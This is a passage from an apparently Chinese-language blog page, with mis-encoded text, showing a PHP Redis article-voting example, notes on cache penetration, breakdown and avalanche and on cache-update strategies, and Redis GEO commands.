class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line">ä¸€ä¸ªç”¨æˆ·å¯¹ä¸€ç¯‡æ–‡ç« åªèƒ½æŠ•ä¸€ç¥¨</span><br><span class="line">ä¸€ç¯‡æ–‡ç« å‘å¸ƒ <span class="number">7</span> å¤©åä¸èƒ½å†è¿›è¡ŒæŠ•ç¥¨</span><br><span class="line">æ–‡ç« å¾—åˆ†è®¡ç®—è§„åˆ™ï¼šå‘å¸ƒæ—¶é—´ + å¾—ç¥¨æ•° X å€æ•°ï¼ˆè¿™é‡Œçš„å€æ•°è®¡ç®—è§„åˆ™ä¸ºï¼š<span class="number">86400</span>/<span class="number">200</span>=<span class="number">432</span>ï¼Œ<span class="number">86400</span> ä¸ºä¸€å¤©çš„ç§’æ•°ï¼Œ<span class="number">200</span> ä¸ºä¸€å¤©æ—¶é—´å¯¹åº”çš„æŠ•ç¥¨æ•°</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Redis In Action</span></span><br><span class="line"><span class="comment"> * æ–‡ç« æŠ•ç¥¨åŠŸèƒ½</span></span><br><span class="line"><span class="comment"> * å‰ææ¡ä»¶ï¼š</span></span><br><span class="line"><span class="comment"> * æ–‡ç« å‘è¡¨æ—¶ï¼Œè®°å½•ä½œè€…ã€å‘è¡¨æ—¶é—´ã€é“¾æ¥ã€æ ‡é¢˜ã€åˆå§‹æŠ•ç¥¨æ•°</span></span><br><span class="line"><span class="comment"> * æ¯è·å¾—ä¸€ä¸ªæŠ•ç¥¨ï¼Œæ–‡ç« è·å¾—432åˆ†ï¼ˆ86400/200ï¼‰</span></span><br><span class="line"><span class="comment"> * æ•°æ®ç»“æ„ï¼š</span></span><br><span class="line"><span class="comment"> * æ–‡ç« hash -- æ¯ç¯‡æ–‡ç« keyçš„å½¢å¼å¦‚ï¼šarticle:92617</span></span><br><span class="line"><span class="comment"> * æ–‡ç« å‘è¡¨æ—¶é—´zseté›†åˆï¼ˆtime:ï¼‰ï¼ŒæŒ‰æ—¶é—´æ’åº -- æ¯æ¡è®°å½•çš„å½¢å¼å¦‚ï¼šarticle:92617ï¼ˆmemberï¼‰  1332065417ï¼ˆscoreï¼‰</span></span><br><span class="line"><span class="comment"> * æ–‡ç« å¾—åˆ†zseté›†åˆ(score:)ï¼ŒæŒ‰åˆ†æ•°æ’åº</span></span><br><span class="line"><span class="comment"> * ç”¨æˆ·å¯¹æ–‡ç« çš„æŠ•ç¥¨seté›†åˆ(vote:xxxx) -- keyå½¢å¼å¦‚ï¼švote:100408ï¼Œitemå½¢å¼å¦‚ï¼šuser:233487</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> ONE_WEEK_IN_SECONDS = <span class="number">7</span> * <span class="number">86400</span>;</span><br><span class="line"><span class="keyword">const</span> VOTE_SCORE = <span class="number">432</span>;</span><br><span class="line"><span class="keyword">const</span> ARTICLES_PER_PAGE = <span class="number">25</span>;</span><br><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis-&gt;connect(<span class="string">'127.0.0.1'</span>, <span class="string">'6379'</span>) || exit(<span class="string">'è¿æ¥å¤±è´¥ï¼'</span>);</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ–‡ç« æŠ•ç¥¨</span></span><br><span class="line"><span class="comment"> * @param Redis $redis</span></span><br><span class="line"><span class="comment"> * @param $user</span></span><br><span class="line"><span class="comment"> * @param $article</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">articleVote</span>(<span class="params">$redis, $user, $article</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $cutoff = time() - ONE_WEEK_IN_SECONDS;</span><br><span class="line">    <span class="comment">//å¯¹å‘è¡¨æ—¶é—´è¶…è¿‡ä¸€å‘¨çš„æ–‡ç« æŠ•ç¥¨ä¸ç”Ÿæ•ˆ</span></span><br><span class="line">    <span class="comment">//è·å– time: æœ‰åºé›†åˆå¯¹åº” member çš„ score</span></span><br><span class="line">    <span class="keyword">if</span> ($redis-&gt;zScore(<span class="string">'time:'</span>, $article) &lt; $cutoff) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $article_id = explode(<span class="string">':'</span>, $article)[<span class="number">1</span>];</span><br><span class="line">    <span class="comment">//æ— åºé›†åˆï¼Œæ·»åŠ è®°å½•ï¼Œå¦‚æœè®°å½•å­˜åœ¨ï¼Œè¿”å›0ï¼ˆè¯´æ˜ç”¨æˆ·å·²å¯¹è¯¥æ–‡ç« æŠ•ç¥¨ï¼‰ï¼Œåä¹‹åˆ™è®¡ç®—åˆ†æ•°</span></span><br><span class="line">    <span class="keyword">if</span> ($redis-&gt;sAdd(<span class="string">'voted:'</span> . $article_id, $user)) &#123;</span><br><span class="line">        <span class="comment">// ä½¿ç”¨äº‹åŠ¡æ“ä½œ</span></span><br><span class="line">        <span class="comment">/*$redis-&gt;multi()</span></span><br><span class="line"><span class="comment">            -&gt;zIncrBy('score:' , VOTE_SCORE, $article) //å¢åŠ æ–‡ç« çš„åˆ†æ•°</span></span><br><span class="line"><span class="comment">            -&gt;hIncrBy($article, 'votes', 1)  //å¢åŠ æ–‡ç« çš„æŠ•ç¥¨æ•°</span></span><br><span class="line"><span class="comment">            -&gt;exec();*/</span></span><br><span class="line">        <span class="comment">//ä½¿ç”¨pipelineå‹çš„äº‹åŠ¡</span></span><br><span class="line">        <span class="comment">//ä¸€æ¬¡æ€§å‘æœåŠ¡ç«¯å‘é€æ‰€æœ‰å‘½ä»¤ï¼Œå‡å°‘å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ä¹‹é—´é€šè®¯å¾€è¿”æ¬¡æ•°</span></span><br><span class="line">        $pipe = $redis-&gt;multi(Redis::PIPELINE);</span><br><span class="line">        $pipe-&gt;zIncrBy(<span class="string">'score:'</span>, VOTE_SCORE, $article);</span><br><span class="line">        $pipe-&gt;hIncrBy($article, <span class="string">'votes'</span>, <span class="number">1</span>);</span><br><span class="line">        $pipe-&gt;exec();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å‘è¡¨æ–‡ç« </span></span><br><span class="line"><span class="comment"> * @param Redis $redis</span></span><br><span class="line"><span class="comment"> * @param string $user example: 'user:123456'</span></span><br><span class="line"><span class="comment"> * @param $title</span></span><br><span class="line"><span class="comment"> * @param $link</span></span><br><span class="line"><span class="comment"> * @return integer</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">postArticle</span>(<span class="params">$redis, $user, $title, $link</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $article_id = $redis-&gt;incr(<span class="string">'article:'</span>);  <span class="comment">//è‡ªå¢1ï¼Œä¸å­˜åœ¨keyåˆ™èµ‹å€¼1</span></span><br><span class="line">    $voted = <span class="string">'voted:'</span> . $article_id;</span><br><span class="line">    $redis-&gt;sAdd($voted, $user);  <span class="comment">//å°†ä½œè€…è®¾ä¸ºå·²æŠ•ç¥¨ç”¨æˆ·</span></span><br><span class="line">    $redis-&gt;expire($voted, ONE_WEEK_IN_SECONDS);  <span class="comment">//æ–‡ç« æŠ•ç¥¨ä¿¡æ¯è®¾ç½®ä¸ºä¸€å‘¨åè‡ªåŠ¨å¤±æ•ˆ</span></span><br><span class="line">    $now = time();</span><br><span class="line">    <span class="comment">//æ·»åŠ æ–‡ç« </span></span><br><span class="line">    $article = <span class="string">'article:'</span> . $article_id;  <span class="comment">//ä½œä¸ºæ–‡ç« hashçš„keyå€¼</span></span><br><span class="line">    $redis-&gt;hMSet($article, [  <span class="comment">//æ‰¹é‡è®¾ç½®hashé”®å€¼å¯¹</span></span><br><span class="line">        <span class="string">'title'</span> =&gt; $title,</span><br><span class="line">		<span class="string">'link'</span> =&gt; $link,</span><br><span class="line">		<span class="string">'poster'</span> =&gt; $user,</span><br><span class="line">		<span class="string">'time'</span> =&gt; $now,</span><br><span class="line">		<span class="string">'votes'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">    ]);</span><br><span class="line">    <span class="comment">//æ³¨æ„zaddç¬¬äºŒä¸ªå‚æ•°ä¸ºscoreï¼Œç¬¬ä¸‰ä¸ªä¸ºmember</span></span><br><span class="line">    $redis-&gt;zAdd(<span class="string">'score:'</span>, $now + VOTE_SCORE, $article);  <span class="comment">//è®¾ç½®æ–‡ç« åˆå§‹åˆ†æ•°</span></span><br><span class="line">    $redis-&gt;zAdd(<span class="string">'time:'</span>,  $now, $article);  <span class="comment">//è®°å½•æ–‡ç« å‘è¡¨æ—¶é—´</span></span><br><span class="line">    <span class="keyword">return</span> $article_id;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è·å–æ–‡ç« åˆ—è¡¨</span></span><br><span class="line"><span class="comment"> * @param Redis $redis</span></span><br><span class="line"><span class="comment"> * @param $page</span></span><br><span class="line"><span class="comment"> * @param string $order  ç”¨æ¥æ’åºçš„æœ‰åºé›†åˆ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getArticles</span>(<span class="params">$redis, $page, $order = <span class="string">'score:'</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $start = ($page - <span class="number">1</span>) * ARTICLES_PER_PAGE;</span><br><span class="line">	$end = $start + ARTICLES_PER_PAGE - <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//è·å–æŒ‡å®šèŒƒå›´å†…çš„memberå€¼ï¼ˆæ–‡ç« IDï¼Œarticle:123456ï¼‰ï¼ŒæŒ‰$orderåˆ†æ•°é€’å‡æ’åº</span></span><br><span class="line">    $ids = $redis-&gt;zRevRange($order, $start, $end);</span><br><span class="line">    $pipe = $redis-&gt;multi(Redis::PIPELINE);</span><br><span class="line">    foreach ($ids <span class="keyword">as</span> $id) &#123;</span><br><span class="line">        $pipe-&gt;hGetAll($id);</span><br><span class="line">        <span class="comment">//ä¸ä½¿ç”¨pipelineçš„æ—¶å€™</span></span><br><span class="line">        <span class="comment">/*$article_data = $redis-&gt;hGetAll($id);</span></span><br><span class="line"><span class="comment">        $article_data['id'] = $id;</span></span><br><span class="line"><span class="comment">        $articles[] = $article_data;*/</span></span><br><span class="line">    &#125;</span><br><span class="line">    $articles = $pipe-&gt;exec();</span><br><span class="line">    <span class="comment">//æŠŠæ–‡ç« IDåŠ å›å»</span></span><br><span class="line">    foreach ($articles <span class="keyword">as</span> $k =&gt; $article) &#123;</span><br><span class="line">        $articles[$k][<span class="string">'id'</span>] = $ids[$k];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $articles;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ·»åŠ /ç§»é™¤æ–‡ç« åˆ†ç±»</span></span><br><span class="line"><span class="comment"> * @param Redis $redis</span></span><br><span class="line"><span class="comment"> * @param $article_id</span></span><br><span class="line"><span class="comment"> * @param array $to_add</span></span><br><span class="line"><span class="comment"> * @param array $to_remove</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addRemoveGroups</span>(<span class="params">$redis, $article_id, $to_add = [], $to_remove = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $article = <span class="string">'article:'</span> . $article_id;</span><br><span class="line">    foreach ($to_add <span class="keyword">as</span> $group) &#123;</span><br><span class="line">        $redis-&gt;sAdd(<span class="string">'group:'</span> . $group, $article);</span><br><span class="line">    &#125;</span><br><span class="line">    foreach ($to_remove <span class="keyword">as</span> $group) &#123;</span><br><span class="line">        $redis-&gt;sRem(<span class="string">'group:'</span> . $group, $article);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è·å–åˆ†ç»„ä¸‹çš„æ–‡ç« æ•°æ®</span></span><br><span class="line"><span class="comment"> * @param Redis $redis</span></span><br><span class="line"><span class="comment"> * @param $group</span></span><br><span class="line"><span class="comment"> * @param $page</span></span><br><span class="line"><span class="comment"> * @param string $order</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getGroupArticles</span>(<span class="params">$redis, $group, $page, $order = <span class="string">'score:'</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $key = $order . $group;</span><br><span class="line">    <span class="keyword">if</span> (!$redis-&gt;exists($key)) &#123;</span><br><span class="line">        <span class="comment">//è·å¾—å¯¹åº”åˆ†ç»„ä¸‹ï¼Œæ–‡ç« -åˆ†æ•°çš„æœ‰åºé›†åˆ</span></span><br><span class="line">        $redis-&gt;zInterStore($key, [<span class="string">'group:'</span> . $group, $order], [<span class="number">1</span>, <span class="number">1</span>], <span class="string">'max'</span>);</span><br><span class="line">        $redis-&gt;expire($key, <span class="number">60</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> getArticles($redis, $page, $key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å‘å¸ƒè‹¥å¹²æ–‡ç« </span></span><br><span class="line">postArticle($redis, <span class="string">'user:1'</span>, <span class="string">'æµ‹è¯•æ–‡ç« 1'</span>, <span class="string">'article-link-1'</span>);</span><br><span class="line">postArticle($redis, <span class="string">'user:2'</span>, <span class="string">'æµ‹è¯•æ–‡ç« 2'</span>, <span class="string">'article-link-2'</span>);</span><br><span class="line">postArticle($redis, <span class="string">'user:3'</span>, <span class="string">'æµ‹è¯•æ–‡ç« 3'</span>, <span class="string">'article-link-3'</span>);</span><br><span class="line"><span class="comment">//ç”¨æˆ·10å¯¹æ–‡ç« 1è¿›è¡ŒæŠ•ç¥¨</span></span><br><span class="line">articleVote($redis, <span class="string">'user:10'</span>, <span class="string">'article:1'</span>);</span><br><span class="line">echo <span class="string">"article:1 çš„æŠ•ç¥¨ç”¨æˆ·:"</span> . PHP_EOL;</span><br><span class="line">$result = $redis-&gt;sMembers(<span class="string">'voted:1'</span>);</span><br><span class="line">print_r($result);</span><br><span class="line">echo <span class="string">"å„æ–‡ç« å¾—åˆ†:"</span> . PHP_EOL;</span><br><span class="line">$scores = $redis-&gt;zRange(<span class="string">'score:'</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="string">'withscores'</span>);</span><br><span class="line">print_r($scores);</span><br><span class="line">echo <span class="string">"æ–‡ç« åˆ—è¡¨:"</span> . PHP_EOL;</span><br><span class="line">$articles = getArticles($redis, <span class="number">1</span>);</span><br><span class="line">print_r($articles);</span><br><span class="line">exit();</span><br><span class="line"><span class="comment">//ç»™æ–‡ç« æ·»åŠ åˆ†ç±»</span></span><br><span class="line">addRemoveGroups($redis, <span class="string">'1'</span>, [<span class="string">'php'</span>, <span class="string">'redis'</span>]);</span><br><span class="line">addRemoveGroups($redis, <span class="string">'2'</span>, [<span class="string">'python'</span>, <span class="string">'redis'</span>]);</span><br><span class="line"><span class="comment">//è·å–â€˜redisâ€™åˆ†ç»„ä¸‹çš„æ–‡ç« </span></span><br><span class="line">$redisGroupArticles = getGroupArticles($redis, <span class="string">'redis'</span>, <span class="number">1</span>);</span><br><span class="line">echo <span class="string">"redisåˆ†ç±»çš„æ–‡ç« åˆ—è¡¨:"</span> . PHP_EOL;</span><br><span class="line">print_r($redisGroupArticles);</span><br><span class="line">https:<span class="comment">//github.com/HubQin/redis-in-action-php/blob/master/article_voting.php</span></span><br><span class="line">https:<span class="comment">//learnku.com/articles/29511</span></span><br></pre></td></tr></table></figure>
<h3 id="ç¼“å­˜ç©¿é€"><a href="#ç¼“å­˜ç©¿é€" class="headerlink" title="ç¼“å­˜ç©¿é€"></a>ç¼“å­˜ç©¿é€</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">ç¼“å­˜ç©¿é€ ï¼š DB æ‰¿å—äº†æ²¡æœ‰å¿…è¦çš„æŸ¥è¯¢æµé‡ï¼Œæ„æ€å°±æ˜¯æŸ¥åˆ°ç©ºå€¼çš„æ—¶å€™æ²¡æœ‰åšç¼“å­˜å¤„ç†ï¼Œå†æ¬¡æŸ¥è¯¢çš„æ—¶å€™ç»§ç»­è¯»åº“äº†</span><br><span class="line">ç¼“å­˜å‡»ç©¿ï¼šçƒ­ç‚¹ Keyï¼Œå¤§é‡å¹¶å‘è¯»è¯·æ±‚å¼•èµ·çš„å°é›ªå´©ï¼Œ å°±æ˜¯ç¼“å­˜åœ¨æŸä¸ªæ—¶é—´ç‚¹è¿‡æœŸçš„æ—¶å€™ï¼Œæ°å¥½åœ¨è¿™ä¸ªæ—¶é—´ç‚¹å¯¹è¿™ä¸ª Key æœ‰å¤§é‡çš„å¹¶å‘è¯·æ±‚è¿‡æ¥ï¼Œè¿™äº›è¯·æ±‚å‘ç°ç¼“å­˜è¿‡æœŸä¸€èˆ¬éƒ½ä¼šä»åç«¯ DB åŠ è½½æ•°æ®å¹¶å›è®¾åˆ°ç¼“å­˜ï¼Œè¿™ä¸ªæ—¶å€™å¤§å¹¶å‘çš„è¯·æ±‚å¯èƒ½ä¼šç¬é—´æŠŠåç«¯ DB å‹å®</span><br><span class="line">ç¼“å­˜é›ªå´©ï¼šç¼“å­˜è®¾ç½®åŒä¸€è¿‡æœŸæ—¶é—´ï¼Œå¼•å‘çš„å¤§é‡çš„è¯»å–æ•°æ®åº“æ“ä½œ</span><br><span class="line">https:<span class="comment">//www.jianshu.com/p/fef1c22d63cb</span></span><br><span class="line"></span><br><span class="line">ï¼ˆ<span class="number">1</span>ï¼‰ç¼“å­˜ç©¿é€</span><br><span class="line"></span><br><span class="line">è¯·æ±‚å»æŸ¥è¯¢ä¸€æ¡å‹æ ¹å„¿æ•°æ®åº“ä¸­æ ¹æœ¬å°±ä¸å­˜åœ¨çš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯ç¼“å­˜å’Œæ•°æ®åº“éƒ½æŸ¥è¯¢ä¸åˆ°è¿™æ¡æ•°æ®ï¼Œä½†æ˜¯è¯·æ±‚æ¯æ¬¡éƒ½ä¼šæ‰“åˆ°æ•°æ®åº“ä¸Šé¢å»ã€‚</span><br><span class="line"></span><br><span class="line">è§£å†³æ–¹æ¡ˆï¼š</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> å¯¹äºè¿”å›ä¸º NULL çš„ä¾ç„¶ç¼“å­˜</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> åˆ¶å®šä¸€äº›è§„åˆ™è¿‡æ»¤ä¸€äº›ä¸å¯èƒ½å­˜åœ¨çš„æ•°æ®</span><br><span class="line"></span><br><span class="line">ï¼ˆ<span class="number">2</span>ï¼‰ç¼“å­˜å‡»ç©¿</span><br><span class="line"></span><br><span class="line">åœ¨å¹³å¸¸é«˜å¹¶å‘çš„ç³»ç»Ÿä¸­ï¼Œå¤§é‡çš„è¯·æ±‚åŒæ—¶æŸ¥è¯¢ä¸€ä¸ª key æ—¶ï¼Œæ­¤æ—¶è¿™ä¸ª key æ­£å¥½å¤±æ•ˆäº†ï¼Œå°±ä¼šå¯¼è‡´å¤§é‡çš„è¯·æ±‚éƒ½æ‰“åˆ°æ•°æ®åº“ä¸Šé¢å»ã€‚è¿™ç§ç°è±¡æˆ‘ä»¬ç§°ä¸ºç¼“å­˜å‡»ç©¿ã€‚</span><br><span class="line"></span><br><span class="line">è§£å†³æ–¹æ¡ˆï¼š</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> åŠ åˆ†å¸ƒå¼é”ï¼Œå¯¹äºè·å–åˆ°è¿™ä¸ªé”çš„çº¿ç¨‹ï¼ŒæŸ¥è¯¢æ•°æ®åº“æ›´æ–°ç¼“å­˜ï¼Œå…¶ä»–çº¿ç¨‹é‡‡å–é‡è¯•ç­–ç•¥</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> é‡‡å–åˆ°æœŸè‡ªåŠ¨åˆ·æ–°çš„ç­–ç•¥ï¼Œè€Œä¸æ˜¯åˆ°æœŸè‡ªåŠ¨æ·˜æ±°</span><br><span class="line"></span><br><span class="line">ï¼ˆ<span class="number">3</span>ï¼‰ç¼“å­˜é›ªå´©</span><br><span class="line"></span><br><span class="line">å½“æŸä¸€æ—¶åˆ»å‘ç”Ÿå¤§è§„æ¨¡çš„ç¼“å­˜å¤±æ•ˆçš„æƒ…å†µï¼Œæ¯”å¦‚ä½ çš„ç¼“å­˜æœåŠ¡å®•æœºäº†ï¼Œä¼šæœ‰å¤§é‡çš„è¯·æ±‚è¿›æ¥ç›´æ¥æ‰“åˆ° DB ä¸Šé¢ã€‚</span><br><span class="line"></span><br><span class="line">è§£å†³æ–¹æ¡ˆï¼š</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> å¢åŠ ç¼“å­˜ç³»ç»Ÿå¯ç”¨æ€§ï¼Œé€šè¿‡ç›‘æ§å…³æ³¨ç¼“å­˜çš„å¥åº·ç¨‹åº¦ï¼Œæ ¹æ®ä¸šåŠ¡é‡é€‚å½“çš„æ‰©å®¹ç¼“å­˜ã€‚</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> é‡‡ç”¨å¤šçº§ç¼“å­˜ï¼Œä¸åŒçº§åˆ«ç¼“å­˜è®¾ç½®çš„è¶…æ—¶æ—¶é—´ä¸åŒï¼ŒåŠæ—¶æŸä¸ªçº§åˆ«ç¼“å­˜éƒ½è¿‡æœŸï¼Œä¹Ÿæœ‰å…¶ä»–çº§åˆ«ç¼“å­˜å…œåº•ã€‚</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> ç¼“å­˜çš„è¿‡æœŸæ—¶é—´å¯ä»¥å–ä¸ªéšæœºå€¼ï¼Œå°½é‡è®©ä¸åŒ Key çš„è¿‡æœŸæ—¶é—´ä¸åŒã€‚</span><br><span class="line"></span><br><span class="line">å…­ã€ç¼“å­˜æ›´æ–°ç­–ç•¥</span><br><span class="line"></span><br><span class="line">ï¼ˆ<span class="number">1</span>ï¼‰Cache Aside</span><br><span class="line"></span><br><span class="line">åº”ç”¨æŸ¥è¯¢æ•°æ®çš„æ—¶å€™å…ˆæŸ¥è¯¢ç¼“å­˜å±‚çš„æ•°æ®ï¼Œå¦‚æœç¼“å­˜ä¸­æ²¡æœ‰åˆ™åˆ°æ•°æ®åº“ä¸­æŸ¥è¯¢æ•°æ®ï¼Œå¹¶æŠŠæ•°æ®æ”¾å…¥ç¼“å­˜å±‚ã€‚</span><br><span class="line"></span><br><span class="line">æ›´æ–°æ•°æ®çš„æ—¶å€™å…ˆå¯¹æ•°æ®åº“è¿›è¡Œæ›´æ–°ï¼Œç„¶åé€šè¿‡æŒ‡ä»¤ä½¿ç¼“å­˜å±‚çš„æ•°æ®å¤±æ•ˆã€‚</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)Read/Write Through</span><br><span class="line"></span><br><span class="line">åº”ç”¨è¦è¯»æ•°æ®å’Œæ›´æ–°æ•°æ®éƒ½ç›´æ¥è®¿é—®ç¼“å­˜æœåŠ¡</span><br><span class="line"></span><br><span class="line">ç¼“å­˜æœåŠ¡åŒæ­¥çš„å°†æ•°æ®æ›´æ–°åˆ°æ•°æ®åº“</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)Write Behind</span><br><span class="line"></span><br><span class="line">åº”ç”¨è¦è¯»æ•°æ®å’Œæ›´æ–°æ•°æ®éƒ½ç›´æ¥è®¿é—®ç¼“å­˜æœåŠ¡</span><br><span class="line"></span><br><span class="line">ç¼“å­˜æœåŠ¡å¼‚æ­¥çš„å°†æ•°æ®æ›´æ–°åˆ°æ•°æ®åº“ï¼ˆé€šè¿‡å¼‚æ­¥ä»»åŠ¡ï¼‰</span><br><span class="line">https:<span class="comment">//learnku.com/articles/29751</span></span><br></pre></td></tr></table></figure>
<h3 id="Redis-çš„-LBS-å°è¯•åœ°ç†ä½ç½®"><a href="#Redis-çš„-LBS-å°è¯•åœ°ç†ä½ç½®" class="headerlink" title="Redis çš„ LBS å°è¯•åœ°ç†ä½ç½®"></a>Redis çš„ LBS å°è¯•åœ°ç†ä½ç½®</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$redis-&gt;rawCommand(<span class="string">'geoadd'</span>, <span class="string">'location'</span>, <span class="string">'120.118007'</span>, <span class="string">'30.259293'</span>, <span class="string">'æ¡ƒå›­å²­'</span>);</span><br><span class="line">$redis-&gt;rawCommand(<span class="string">'geoadd'</span>, <span class="string">'location'</span>, <span class="string">'120.119445'</span>,<span class="string">'30.255082'</span>, <span class="string">'å†œè€•ç§‘æ™®å›­'</span>);</span><br><span class="line">$redis-&gt;rawCommand(<span class="string">'geoadd'</span>, <span class="string">'location'</span>, <span class="string">'120.071655'</span>,<span class="string">'30.272893'</span>, <span class="string">'è¥¿æºªæ¹¿åœ°'</span>);</span><br><span class="line">$redis-&gt;rawCommand(<span class="string">'geoadd'</span>, <span class="string">'location'</span>, <span class="string">'120.114321'</span>,<span class="string">'30.221218'</span>, <span class="string">'é¾™äº•æ‘'</span>);</span><br><span class="line">$redis-&gt;rawCommand(<span class="string">'geoadd'</span>, <span class="string">'location'</span>, <span class="string">'120.145012'</span>,<span class="string">'30.205586'</span>, <span class="string">'ç™½å¡”å…¬å›­'</span>);</span><br><span class="line">$redis-&gt;rawCommand(<span class="string">'geoadd'</span>, <span class="string">'location'</span>, <span class="string">'120.112912'</span>,<span class="string">'30.224221'</span>, <span class="string">'åé‡Œç…ç°'</span>);</span><br><span class="line">$redis-&gt;rawCommand(<span class="string">'geoadd'</span>, <span class="string">'location'</span>, <span class="string">'120.107264'</span>,<span class="string">'30.206997'</span>, <span class="string">'ç‹®å³°'</span>);</span><br><span class="line">$redis-&gt;rawCommand(<span class="string">'geoadd'</span>, <span class="string">'location'</span>, <span class="string">'120.117936'</span>,<span class="string">'30.227969'</span>, <span class="string">'çœŸè¿¹å¯º'</span>);</span><br><span class="line">$redis-&gt;rawCommand(<span class="string">'geoadd'</span>, <span class="string">'location'</span>, <span class="string">'120.10826'</span>,<span class="string">'30.246569'</span>, <span class="string">'çµéšå¯º'</span>);</span><br><span class="line">$redis-&gt;rawCommand(<span class="string">'geoadd'</span>, <span class="string">'location'</span>, <span class="string">'120.114123'</span>,<span class="string">'30.264152'</span>, <span class="string">'çŠ¶å…ƒå³°'</span>);</span><br><span class="line">æˆ‘ä»¬è·å–è¥¿æºªæ¹¿åœ°å’Œé¾™äº•æ‘çš„è·ç¦»</span><br><span class="line"></span><br><span class="line">$ret = $redis-&gt;rawCommand(<span class="string">'GEODIST'</span>, <span class="string">'location'</span>,<span class="string">'è¥¿æºªæ¹¿åœ°'</span>, <span class="string">'é¾™äº•æ‘'</span>, <span class="string">'m'</span>);</span><br><span class="line">print_r($ret);  <span class="comment">//7060.0083</span></span><br><span 